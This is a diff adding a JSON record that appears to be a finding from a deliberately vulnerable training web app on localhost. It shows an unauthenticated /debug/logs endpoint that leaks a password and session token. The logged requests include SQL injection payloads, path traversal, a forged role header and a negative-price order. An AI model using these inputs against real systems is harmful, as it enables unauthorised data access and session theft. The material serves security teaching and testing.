@@ -1,0 +1,164 @@
+{
+  "name": "07_debug_logs_leak",
+  "title": "Утечка паролей и токенов через /debug/logs",
+  "request": "GET /debug/logs (без токена)",
+  "status": 200,
+  "response": [
+    {
+      "method": "POST",
+      "target": "/login",
+      "body": {
+        "username": "alice",
+        "password": "learn-alice"
+      },
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Content-Length": "48",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/profile?id=0%20OR%201=1",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/profile?id=-1%20UNION%20SELECT%201%2Csql%2C3%2C4%20FROM%20sqlite_master",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/search?q=%%27%20OR%20%271%27=%271",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/profile?id=2",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/orders",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/search?q=TEST",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "POST",
+      "target": "/orders",
+      "body": {
+        "product": "chair",
+        "price": -1
+      },
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Content-Length": "33",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "X-Token": "88ac8dfab4b94a28bebf2b34eb5d332f",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/admin/export",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "X-Role": "staff",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/files?user=bob&path=receipt.txt",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "X-Token": "88ac8dfab4b94a28bebf2b34eb5d332f",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/files?user=..&path=private/operator-note.txt",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    },
+    {
+      "method": "GET",
+      "target": "/debug/logs",
+      "body": {},
+      "headers": {
+        "Accept-Encoding": "identity",
+        "Host": "127.0.0.1:8077",
+        "User-Agent": "Python-urllib/3.10",
+        "Content-Type": "application/json",
+        "Connection": "close"
+      }
+    }
+  ],
+  "verdict": "В журнале видны пароль learn-alice и X-Token — кража сессии"
+}
